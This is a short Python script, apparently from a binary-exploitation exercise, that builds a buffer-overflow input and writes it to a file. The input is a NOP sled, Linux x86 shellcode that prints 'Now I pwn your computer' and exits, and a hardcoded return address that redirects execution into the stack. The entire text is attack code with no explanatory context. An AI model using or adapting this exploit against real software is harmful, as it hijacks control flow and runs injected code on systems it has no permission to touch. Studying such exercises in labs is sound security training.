from struct import pack
from binascii import unhexlify

buf = ""
buf += unhexlify("90"*209)

buf += unhexlify("eb1931c0b00431dbb3015931d2b217cd8031c0b00131dbb301cd80e8e2ffffff4e6f7720492070776e20796f757220636f6d7075746572")

buf += pack("<Q", 0x7fffffffe4d0)

print(len(buf))

out = open('in.txt', 'w')
out.write(buf)
